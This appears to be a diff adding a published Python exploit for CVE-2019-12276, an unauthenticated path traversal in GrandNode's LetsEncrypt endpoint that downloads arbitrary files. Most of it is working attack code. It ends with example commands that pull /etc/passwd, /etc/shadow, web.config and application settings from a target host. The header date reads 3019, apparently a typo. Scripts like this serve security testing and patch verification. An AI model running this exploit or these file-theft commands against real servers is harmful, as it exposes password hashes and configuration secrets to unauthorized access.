@@ -1,0 +1,59 @@
+# Exploit Title: GrandNode Path Traversal & Arbitrary File Download (Unauthenticated)
+# Date: 06/23/3019
+# Exploit Author: Corey Robinson (https://twitter.com/CRobSec)
+# Vendor Homepage: https://grandnode.com/
+# Software Link: https://github.com/grandnode/grandnode/archive/728ca1ea2f61aead7c8c443407096b0ef476e49e.zip
+# Version: <= v4.40 (before 5/30/2019)
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2019-12276
+
+'''
+CVE-2019-12276
+
+A path traversal vulnerability in the LetsEncryptController allows remote unauthenticated users to 
+view any files that the application has read/view permissions to. This vulnerability affects 
+Windows and Unix operating systems.
+
+For more details, see: https://security401.com/grandnode-path-traversal/
+
+'''
+
+import requests
+import argparse
+
+def exploit(url, file):
+    
+    session = requests.Session()
+
+    paramsGet = {"fileName":file}
+    rawBody = "\r\n"
+
+    response = session.get("{}/LetsEncrypt/Index".format(url), data=rawBody, params=paramsGet)
+
+    if "UnauthorizedAccessException" in response.content or response.status_code == 500:
+        print("Access to the path '{}' is denied.".format(file))
+        return	
+
+    content_length = int(response.headers['Content-Length'])
+
+    if content_length == 0:
+        print("The '{}' file was not found.".format(file))	
+    else:
+        print("-" *22)
+        print(response.content)
+        print("-" *22)
+
+
+if __name__ == "__main__":
+
+    parser = argparse.ArgumentParser(description='GrandNode CVE-2019-12276 Path traversal & Arbitrary File Download')
+    parser.add_argument('-u', action="store", dest="url", required=True, help='Target URL')
+    parser.add_argument('-f', action="store", dest="file", required=True, help='The file to download')
+    args = parser.parse_args()
+
+    exploit(args.url, args.file)
+
+# python gn.py -u http://172.16.2.22:5001 -f "/etc/passwd"
+# python gn.py -u http://172.16.2.22:5001 -f "../../../App_Data/Settings.txt"
+# python gn.py -u http://172.16.2.22:5001 -f "/etc/shadow"
+# python gn.py -u http://172.16.2.22:5001 -f "../../../web.config"
